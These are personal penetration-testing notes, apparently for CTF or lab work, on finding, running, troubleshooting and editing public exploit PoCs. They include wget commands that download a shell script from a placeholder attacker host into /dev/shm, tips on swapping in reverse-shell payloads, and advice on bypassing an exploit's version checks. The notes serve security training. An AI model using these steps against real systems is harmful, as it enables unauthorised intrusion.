<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Exploit Research</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Exploit Research</h1><br/><p><h1>Finding PoCs</h1><ul><li>Start by checking Exploit-db, Github, <span style="color:#ff0000;">&amp;</span> <a href="https://packetstorm.news/">Packetstormsecurity</a>, but it could be elsewhere even if there aren&#39;t any PoCs there. Try Google Dorking (ensure dashes in &quot;CVE-...&quot; don&#39;t exclude content from search)</li></ul></p><p><ul><li>Exploit could&#39;ve <span style="color:#ff0000;">PoC under unexpected name</span>, so try all name variations (e.g could be found using EDUCATEDSCHOLAR, CVE-2009-3103, CVE 2009 3103) (e.g Pwnkit, Pkexec, Polkit, CVE-2021-4034)</li></ul></p><p><ul><li>Similarly, <span style="color:#ff0000;">PoCs may refer to vuln SW via diff names</span>. (e.g Sonatype Nexus vs Nexus Repository Manager)</li></ul></p><p><ul><li><span style="color:#ff0000;">Vuln could</span> be listed as affecting a certain ver #, or range of ver #, yet still <span style="color:#ff0000;">affect prev ver that aren&#39;t referenced in Exploit title</span>. HOWEVER...</li></ul></p><p><ul><li>Vulns often introduced with an update, so SW with an earlier ver # are often not vuln to an Exploit that affects later version</li></ul></p><p><ul><li>Always start research using <span style="color:#ff0000;">VAUGE version number</span>. For example, searching ver <strong>25.0.00</strong> may miss things that you&#39;d find by just using <strong>25</strong>. (e.g. if the vuln affects 25.0.01 &amp; prior).</li></ul></p><p><ul><li>Look for any identifiable words on any pages of a Web App (e.g. <strong>Welcome to Pathfinder </strong><strong><span style="color:#ff0000;">Restaurant Management System</span></strong> appeared after logging in).</li></ul></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: PacketStorm often has PoCs that you won&#39;t find using other resources. <a href="https://www.tenable.com">Tenable</a> also frequently links to PoCs under <strong>Information</strong> ↓ <strong>References</strong>.</p><p></p><p><h2>Searchsploit</h2></p><p>Filter out Metasploit like-</p><p></p><p><em>searchsploit Privilege Escalation | uniq | grep -v Metasploit | grep -i &quot;windows &quot;</em></p><p></p><p><h2>Pre-Compiled</h2></p><p><h3>Exploit-DB</h3></p><p>As long as no modifications need to be done, official Exploit-DB binaries found <a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits">here</a>.</p><p></p><p>Click <strong>bin-sploits</strong> → <strong>Find File </strong>(top Right) &amp; Enter EBD-ID number (won&#39;t show all files until you start typing)</p><p></p><p><h3>Github</h3></p><p>Sometimes precompiled versions are availabe as <strong>releases</strong></p><p></p><p><h2>PacketStorm</h2></p><p><a href="https://packetstorm.news/">Packetstormsecurity</a> gives you the option to search for <strong>Files</strong> or <strong>CVE</strong> (e.g. search CVE-2021-3817).</p><p></p><p>PoCs will be under <strong>Files</strong>, but you may find additional CVE background info under <strong>CVE</strong>.</p><p></p><p>If PacketStorm doesn&#39;t have a PoC for a specific CVE, it won&#39;t appear under <strong>Files</strong> even if that vuln has an entry under <strong>CVE</strong>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Sometimes there will be a <span style="color:#ff0000;">PoC file listed under a </span><strong><span style="color:#ff0000;">CVE</span></strong><span style="color:#ff0000;"> entry</span>. The PoC may have a different name which prevented it from appearing when you searched <strong>Files</strong>. However-</p><p></p><p>Some CVEs can be <span style="color:#ff0000;">leveraged in multiple ways</span>. You may be better off checking Github for more PoCs. For example, 1 PoC may send you an email to reset an Admin&#39;s password while, another PoC uses the same CVE to directly get RCE.</p><p></p><p><h1>Using PoCs</h1><ul><li>Read PoC code &amp; README. Sometimes author is wrong about what code does or how to use it, so code needs tweaks.</li></ul></p><p><ul><li>Some clowns publish PoCs (e.g to Exploit-DB) that require other files to run &amp; make no mention of this. Read thru code &amp; any errors. May be able to find these files elsewhere (i.e Github).</li></ul></p><p><ul><li>May help to manually run the code from a shell script 1 line at a time.</li></ul></p><p><ul><li>Sometimes error don&#39;t matter, &amp; you should continue running exploit anyways!</li></ul></p><p><ul><li>Better to use python2 than try to convert to python3 via 2to3, if possible.</li></ul></p><p></p><p><span style="color:#ff0000;">Some PoCs have a delay</span> before working. Give &#39;em time to cook.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: <span style="color:#ff0000;">Errors can be misleading</span>. For ex, <strong>&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</strong> may not mean that the URL doesn&#39;t exist, or that the exploit didn&#39;t work!</p><p></p><p><h2>Unique Considerations</h2></p><p>[CTF C 2]</p><p></p><p>The context in which an exploit is being used may be unique to your target, requiring modifications to the args or script itself.</p><p></p><p><h2>Cookies</h2></p><p><span style="color:#ff0000;">Site may use &gt;1 cookie</span> for diff things &amp; a PoC <span style="color:#ff0000;">may require 1 specific cookie</span> as an arg. You can also edit the script to <a href="Appendix--Code--Python_77.html#Adding Cookies">hardcode the cookie</a> to send it with the Request.</p><p></p><p>When in doubt, may be possible to pass them all as an arg like, <strong>&quot;PHPSESSID=jhfples17og2356031v62isgum; OpenEMR=fqhlgo28ihhsagl1aqu7plbm7r&quot;</strong></p><p></p><p><h3>Obtain Cookies</h3></p><p>Diff actions may cause diff cookies to be set. For ex, a login attempt may set 1 cookie, whereas visiting a certain subdir may set a diff cookie.</p><p></p><p>To get a cookie that&#39;s set by visiting a specific subdir, you can use<em> curl -I</em> to get Resp headers.</p><p></p><p><em>curl -I http://192.168.152.145/filemanager/</em></p><p></p><p><h2>Pointing to Attacker&#39;s URL</h2></p><p>May sometimes have issues connecting to Attacker&#39;s HTTP server via a payload. You may be able to <span style="color:#ff0000;">omit the protocol section of the Attacker&#39;s URL</span>, &amp; this could help. For ex-</p><p></p><p><em>wget ATKER/shell.sh -O /dev/shm/shell.sh</em>		<span style="color:#ff0000;">Works!</span></p><p><em>wget http://ATKER/shell.sh -O /dev/shm/shell.sh</em>		<span style="color:#ff0000;">Didn&#39;t work!</span></p><p></p><p>wget automatically assumed HTTP protocol, &amp; automatically added that part on the backend. The <span style="color:#ff0000;">same works with curl</span>.</p><p></p><p>I believe this <span style="color:#ff0000;">only occurs for HTTP if no port is specified</span>!</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Does this issue has to do with Encoding or Sanitziation?</p><p></p><p><h3>Upload Destination</h3></p><p>All users on Linux should have R/W for <strong>/tmp/ </strong>&amp; <strong>/dev/shm/</strong>, so try those for uploading files.</p><p></p><p><h2>Dependencies</h2><h2></h2></p><p><h2></h2>Typically, you never want to use sudo/root!</p><p></p><p><h3>Ruby</h3><h3></h3></p><p><h3></h3><a href="Appendix--Code--Ruby_88.html#Ruby Dependencies">Ruby Setup</a><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><em>gem install --user-install GEM</em><h3></h3></p><p><h3></h3><h3></h3></p><p><h3>Python</h3><h2></h2></p><p><h2></h2>Setting up a <a href="Appendix--Code--Python_77.html#python venv">Python Virtual Environment</a> is the safest way, or may be able to-</p><p></p><p><em>pip install MODULE</em><h2></h2></p><p><h2></h2></p><p><h1>Editing Exploits </h1><ul><li>Always <span style="color:#ff0000;">make a copy</span> of the OG before modifiying anything. This lets you revert back if something changed, &amp; know what changes you need to document for write-up.</li></ul></p><p><ul><li><span style="color:#060f94;">★</span>Often need to <span style="color:#ff0000;">change filepath to point to webroot</span> of target! Compare PoC to known subdirs found while fuzzing. (e.g. SW uses <strong>/rms/</strong> as root URL, so you need to specify that in the target URL).</li></ul></p><p><ul><li>If PoC involves compilation, may need to change compiler (e.g <em>gcc</em> → <em>gcc-9</em>)</li></ul></p><p><ul><li>Look for unique requirements. Sometimes a PoC needs you to run a listener / web server at a certain port, or even run a proxy (i.e. burpsute).</li></ul></p><p></p><p><h2>Troubleshooting Exploit</h2></p><p><span style="color:#060f94;">★</span>Sometimes it just needs to be <span style="color:#ff0000;text-decoration:underline;">re-run exactly as is</span> to appease the hacking gods.</p><p></p><p>The following is generically applicable, but more info is available for language specific troubleshooting. Read through <a href="Appendix--Code--Python_77.html">Python</a> section.</p><p></p><p><h3>New Line Issues</h3></p><p>It&#39;s very common for PoC&#39;s to have an issue where long lines are split into 2 new lines, even if you downloaded the PoC with <strong>searchsploit</strong>.</p><p></p><p>It often causes errors in strings, since the starting &amp; ending quotes are on different lines. Just use a text-editor like <strong>vim</strong> to manually correct this.</p><p></p><p><h3>Changing the Payload</h3></p><p>You may need to <span style="color:#ff0000;">change the port</span> that a PoC uses for a Reverse Shell payload, <span style="color:#ff0000;">or swap out</span> that default payload entirely.</p><p></p><p>Ensure that you preserve the correct syntax / escaping for the PoC.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Payloads that <span style="color:#ff0000;">spawn a Reverse Shell may be more reliable</span> than payloads that create a web page with a command prompt. These payloads <span style="color:#ff0000;">may even work if</span> the Web App throws a <span style="color:#ff0000;">404</span> when you try navigating to it&#39;s URL.</p><p></p><p><h3>Vulnerable Version Checker</h3><h3></h3></p><p><h3></h3>Sometimes <span style="color:#ff0000;">falsely flags target as not vuln version, as patched</span>, or as <span style="color:#ff0000;">not running the vuln SW</span>. Can edit exploit to remove this behavior (e.g for python script comment out <strong>sys.exit(0)</strong> &amp; replace with <strong>return</strong> to exit the ver checker loop).</p><p></p><p>Another option is to comment out the <strong>if</strong> conditional &amp; replace it with something that&#39;ll always evaluate true. For ex, in Python-</p><p></p><p><strong>if 1==1:</strong></p><p><h3></h3></p><p><h3>Dynamic Scraping</h3></p><p>If it uses a web scraper like soup, &amp; you get errors like <strong>TypeError: &#39;NoneType&#39; object</strong>, about a variable missing or being incorrect, etc-</p><p></p><p><span style="color:#ff0000;">Verify that all the connection info is correct! </span>(i.e Target URL, creds, etc)</p><p></p><p>If you supplied incorrect info &amp; soup can&#39;t connect, then it can&#39;t scrape the neccessary values for variables.</p><p></p><p><h3>Using Blank String for Arguments</h3></p><p>A PoC may wnat you to supply a value for an arg, even if you don&#39;t have any value for it. For ex, if it wants a path to a site&#39;s subdir but you want to target webroot.</p><p></p><p>Running PoC without supplying this arg may give an error like- <strong>TypeError: can only concatenate str (not &quot;NoneType&quot;) to str</strong></p><p></p><p>If it wants a string, give it a string. Try supplying an empty string for the arg&#39;s value (e.g<strong> -U “”</strong> )</p><p></p><p><h3>To Shebang or Not to Shebang</h3></p><p>Some exploits <span style="color:#ff0000;">must be invoked like &quot;python3 ...&quot; </span>instead of using the shebang, like <strong>./SCRIPT.py</strong>.</p><p></p><p>Other exploits <span style="color:#ff0000;">must be invoked using the shebang</span> (after <em>chmod +x ./SCRIPT.py</em>) like <strong>./SCRIPT.py</strong>.</p><p></p><p>In some cases, I believe this could have to do with the number of expected args.</p><p></p><p><h2>Manual Exploitation</h2></p><p>If all else fails, you may have more success by using the code in a PoC to manually exploit the target. This can eliminate extra vairables, &amp; even if the exploit still fails, you may be able to see more information as to what the issue is.</p><p></p><p><h3>Converting Syntax</h3></p><p>You can use a tool like Cyberchef to make it easier to convert a script into a manual version. For example, using <strong>Find / Replace</strong> to isloate headers that you&#39;ll use with burpsuite.</p><p></p><p><h3>Burpsuite</h3></p><p>If you send a Request via Burpsuite (e.g. <strong>Repeater</strong>), you&#39;ll be able to see the Response better than if you used something like Python&#39;s requests library.</p><p></p><p><h1>Tips</h1><ul><li>If you&#39;re copy/pasting code from Exploit-DB or Github, select “<strong>View Raw</strong>” to avoid formatting issues.</li></ul></p><p><ul><li>May be easier to write C scripts on Attacker machine &amp; transfer to target for compilation.</li></ul></p><p><ul><li>Try <span style="color:#ff0000;">diff PoCs for the same exploit</span>, &amp; have try having them <span style="color:#ff0000;">exe diff payloads</span> if needed. <span style="color:#ff0000;">Some PoCs may give RCE as diff users</span>.</li></ul></p><p><ul><li>There may be special instructions in README, in output of PoC, or in the Source Code! Not always clearly explained! If possible, watch a demo video.</li></ul></p><p><ul><li>There may be &gt;1 exploit, &amp;<span style="color:#ff0000;"> a diff exploit may give you RCE for diff Acct</span>! [CTF B 229]</li></ul></p><p><ul><li>Some exploits have <span style="color:#ff0000;">multiple accompanying scripts</span> that must be present (i.e <span style="color:#ff0000;">in the same dir</span>).   These are typically in the same Repo, occasionally they&#39;re appended at the bottom of the PoC for you to manually make a new file (e.g for Exploit-DB), but they may also exist elswhere (e.g if Author just copied someone else&#39;s PoC).</li></ul></p><p><ul><li>Depending on the context, a payload may require a specific type of encoding, so it can be useful to look at examples if possible. (e.g CAN&#39;T encode<strong> .</strong> , <strong>- </strong>,or <strong>/</strong> for curl with CVE-2022-26134)</li></ul></p><p><ul><li><span style="color:#ff0000;">If PoC uses a stager</span>, take note of <span style="color:#ff0000;">how payload is being served</span>. For ex, may need to start HTTP server on certain port.</li></ul></p><p><ul><li>Look at the shebang at the start of script. If it&#39;s writted for <strong>python2</strong> use that to invoke the script. Often more reliable than trying to convert (e.g with 2to3)</li></ul></p><p><ul><li>A<span style="color:#ff0000;"> PoC&#39;s “help” may not be correct</span>! For ex, running <a href="https://www.exploit-db.com/exploits/49359">49359</a> incorrectly only shows 1 arg, URL. Really needs 3 args!</li></ul></p><p><ul><li>Rarely, a PoC needs to be <span style="color:#ff0000;">run directly from root</span> &amp; just using <strong>sudo</strong> won&#39;t work!</li></ul></p></div>
</body>
</html>
